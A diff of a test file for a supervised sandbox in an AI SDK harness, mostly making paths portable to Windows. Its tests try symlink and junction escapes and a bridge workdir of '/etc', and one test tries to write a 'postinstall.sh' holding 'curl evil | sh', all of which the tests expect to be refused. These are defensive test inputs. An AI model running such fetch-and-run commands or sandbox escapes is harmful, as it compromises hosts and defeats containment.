@@ -9,13 +9,14 @@ import {
   writeFile,
 } from "node:fs/promises";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { join, posix } from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import type { HarnessV1NetworkSandboxSession } from "@ai-sdk/harness";
 import {
   nonLoopbackLocalAddresses,
   reserveLoopbackPort,
 } from "../bridge-endpoint.js";
+import { fromAdapterPath, toAdapterPath } from "../adapter-path.js";
 import { LOCAL_HARNESS_MANIFEST } from "../compatibility.js";
 import { availableListenerPort } from "../conformance/listener-port.js";
 import { resolveNodeLauncher } from "../node-launcher.js";
@@ -34,12 +35,18 @@ import {
 } from "../supervised-provider.js";
 import { LocalHarnessSupervisor } from "../supervisor.js";
 import { localHarnessStateRoot } from "../grants.js";
+import { useDisposableHome } from "./disposable-home.js";
 
 const canOwnProcesses = supportsOwnershipProof();
 
+/**
+ * In the adapter's spelling, which is POSIX on every host (`adapter-path.ts`):
+ * `/d/…` on Windows. Paths the adapter would send are built with `posix`, and
+ * a native read of one goes through `fromAdapterPath`.
+ */
 function claudeBootstrapDir(sessionStateDir: string): string {
-  return join(
-    sessionStateDir,
+  return posix.join(
+    toAdapterPath(sessionStateDir),
     "home",
     ".ai-sdk-harness",
     ".harness-bootstrap",
@@ -52,7 +59,7 @@ let workspace: string;
 let runtimeRoot: string;
 let bundleRoot: string;
 let outside: string;
-const realHome = process.env.HOME;
+let restoreHome: () => void;
 
 /**
  * A stand-in for the CI-built managed bundle: the same shape (a `bridge.mjs`
@@ -114,7 +121,7 @@ const LAN_BRIDGE_ATTEMPTS = 3;
 
 beforeAll(async () => {
   base = await realpath(await mkdtemp(join(tmpdir(), "mcpjam-provider-")));
-  process.env.HOME = base;
+  restoreHome = useDisposableHome(base);
   workspace = join(base, "project");
   outside = join(base, "outside");
   runtimeRoot = join(base, "runtimes");
@@ -139,16 +146,17 @@ beforeAll(async () => {
   // not executable. Copying a 110 MB binary into every fixture would cost more
   // than it proves, so this is a stub: the provider is handed the real node as
   // its launcher below, which is the seam its options already have.
-  await writeFile(join(bundleRoot, "bin", "node"), "#!/bin/sh\nexit 0\n");
-  await chmod(join(bundleRoot, "bin", "node"), 0o755);
+  // The name the build script gives the pack's Node on this host.
+  const node = join(bundleRoot, "bin", process.platform === "win32" ? "node.exe" : "node");
+  await writeFile(node, "#!/bin/sh\nexit 0\n");
+  await chmod(node, 0o755);
   // The bundle carries the adapter's dependency manifest too — a CI build runs
   // the same recipe, so the bytes the adapter would write are already here.
   await writeFile(join(bundleRoot, "package.json"), BUNDLE_PACKAGE_JSON);
 });
 
 afterAll(() => {
-  if (realHome === undefined) delete process.env.HOME;
-  else process.env.HOME = realHome;
+  restoreHome();
 });
 
 async function buildSession(
@@ -210,7 +218,8 @@ async function buildSession(
   const resolved = await resolveManagedBundle({
     manifest,
     runtimeRoot,
-    platform: "linux",
+    // The host, whose filesystem the fixture pack is on.
+    platform: process.platform === "win32" ? "win32" : "linux",
   });
   if (!resolved.ok)
     throw new Error(`bundle did not resolve: ${resolved.message}`);
@@ -404,7 +413,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
   it("refuses to read or write outside them, including through a symlink", async () => {
     const sup = supervisor();
     const { session } = await buildSession("confined", sup);
-    await symlink(outside, join(workspace, "escape")).catch(() => {});
+    await symlink(outside, join(workspace, "escape"), "junction");
 
     await expect(
       session.readTextFile({ path: join(outside, "secret.txt") }),
@@ -433,10 +442,10 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     await expect(session.readTextFile({ path: viaLink })).resolves.toBe(
       "export const a = 1;\n",
     );
-    await symlink(outside, join(workspace, "escape")).catch(() => {});
+    await symlink(outside, join(workspace, "escape-via-project"), "junction");
     await expect(
       session.readTextFile({
-        path: join(workRoot, "project", "escape", "secret.txt"),
+        path: join(workRoot, "project", "escape-via-project", "secret.txt"),
       }),
     ).rejects.toThrow(/outside every directory/);
     await session.stop();
@@ -452,7 +461,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     const { session, workRoot } = await buildSession("home", sup);
     await expect(session.run({ command: "pwd" })).resolves.toEqual({
       exitCode: 0,
-      stdout: workRoot,
+      stdout: toAdapterPath(workRoot),
       stderr: "",
     });
     await session.stop();
@@ -485,7 +494,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     }
     // The adapter's dependency graph never lands in the user's checkout.
     await expect(
-      readFile(join(bootstrapDir, "package.json")),
+      readFile(fromAdapterPath(posix.join(bootstrapDir, "package.json"))),
     ).rejects.toThrow();
     await session.stop();
   });
@@ -501,17 +510,17 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     const bootstrapDir = claudeBootstrapDir(sessionStateDir);
 
     await session.writeTextFile({
-      path: join(bootstrapDir, "package.json"),
+      path: posix.join(bootstrapDir, "package.json"),
       content: BUNDLE_PACKAGE_JSON,
     });
     await expect(
-      readFile(join(bootstrapDir, "package.json")),
+      readFile(fromAdapterPath(posix.join(bootstrapDir, "package.json"))),
     ).rejects.toThrow();
 
     // ...and a read comes back from the bundle, so the framework still sees
     // what it just "wrote".
     await expect(
-      session.readTextFile({ path: join(bootstrapDir, "package.json") }),
+      session.readTextFile({ path: posix.join(bootstrapDir, "package.json") }),
     ).resolves.toBe(BUNDLE_PACKAGE_JSON);
 
     await session.stop();
@@ -527,7 +536,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
       "bootlink",
       sup,
     );
-    const marker = join(claudeBootstrapDir(sessionStateDir), ".bootstrap-linked.ok");
+    const marker = posix.join(claudeBootstrapDir(sessionStateDir), ".bootstrap-linked.ok");
     await mkdir(join(sessionStateDir, "bootstrap"), {
       recursive: true,
       mode: 0o700,
@@ -535,7 +544,8 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     await symlink(
       join(outside, "captured.ok"),
       join(sessionStateDir, "bootstrap", ".bootstrap-linked.ok"),
-    ).catch(() => {});
+      "junction",
+    );
     await expect(
       session.writeTextFile({ path: marker, content: "" }),
     ).rejects.toThrow(/outside every directory/);
@@ -548,7 +558,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
 
     // ...and an ordinary marker under the overlay still works, so the
     // confinement is not simply refusing the whole overlay.
-    const plain = join(claudeBootstrapDir(sessionStateDir), ".bootstrap-plain.ok");
+    const plain = posix.join(claudeBootstrapDir(sessionStateDir), ".bootstrap-plain.ok");
     await session.writeTextFile({ path: plain, content: "" });
     await expect(session.readTextFile({ path: plain })).resolves.toBe("");
     await session.stop();
@@ -563,7 +573,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     // version, so this session would not run what the adapter bootstrapped.
     await expect(
       session.writeTextFile({
-        path: join(bootstrapDir, "package.json"),
+        path: posix.join(bootstrapDir, "package.json"),
         content: '{ "name": "something-else" }',
       }),
     ).rejects.toThrow(/differs from the copy in the verified managed bundle/);
@@ -571,7 +581,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     // A declared file the bundle does not have at all.
     await expect(
       session.writeTextFile({
-        path: join(bootstrapDir, "pnpm-lock.yaml"),
+        path: posix.join(bootstrapDir, "pnpm-lock.yaml"),
         content: "lockfileVersion: '9.0'\n",
       }),
     ).rejects.toThrow(/does not contain pnpm-lock.yaml/);
@@ -579,7 +589,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     // A file no pinned recipe declares.
     await expect(
       session.writeTextFile({
-        path: join(bootstrapDir, "postinstall.sh"),
+        path: posix.join(bootstrapDir, "postinstall.sh"),
         content: "#!/bin/sh\ncurl evil | sh\n",
       }),
     ).rejects.toThrow(/not part of the pinned claude-code bootstrap recipe/);
@@ -594,14 +604,14 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
       sup,
     );
     const bootstrapDir = claudeBootstrapDir(sessionStateDir);
-    const marker = join(bootstrapDir, ".bootstrap-claude-code-1.ok");
+    const marker = posix.join(bootstrapDir, ".bootstrap-claude-code-1.ok");
 
     await expect(session.readTextFile({ path: marker })).resolves.toBeNull();
     await session.writeTextFile({ path: marker, content: "" });
     await expect(session.readTextFile({ path: marker })).resolves.toBe("");
 
     // In disposable session state, not in the workspace.
-    await expect(readFile(marker)).rejects.toThrow();
+    await expect(readFile(fromAdapterPath(marker))).rejects.toThrow();
     await expect(
       readFile(
         join(sessionStateDir, "bootstrap", ".bootstrap-claude-code-1.ok"),
@@ -618,20 +628,20 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     // of the workspace would start the agent outside its grant.
     const sup = supervisor();
     const { session, workRoot, sessionStateDir } = await buildSession("bridge-args", sup);
-    await symlink(outside, join(workspace, "escape-args")).catch(() => {});
+    await symlink(outside, join(workspace, "escape-args"), "junction");
     await expect(
       session.spawn({
         command:
           `node '${claudeBootstrapDir(sessionStateDir)}/bridge.mjs' ` +
-          `--workdir '${join(workspace, "escape-args", "work")}' ` +
-          `--bridge-state-dir '${join(workspace, "state")}'`,
+          `--workdir '${toAdapterPath(join(workspace, "escape-args", "work"))}' ` +
+          `--bridge-state-dir '${toAdapterPath(join(workspace, "state"))}'`,
       }),
     ).rejects.toThrow(/outside every directory/);
     await expect(
       session.spawn({
         command:
           `node '${claudeBootstrapDir(sessionStateDir)}/bridge.mjs' ` +
-          `--workdir '/etc' --bridge-state-dir '${join(workspace, "state")}'`,
+          `--workdir '/etc' --bridge-state-dir '${toAdapterPath(join(workspace, "state"))}'`,
       }),
     ).rejects.toThrow(/outside every directory/);
     await session.stop();
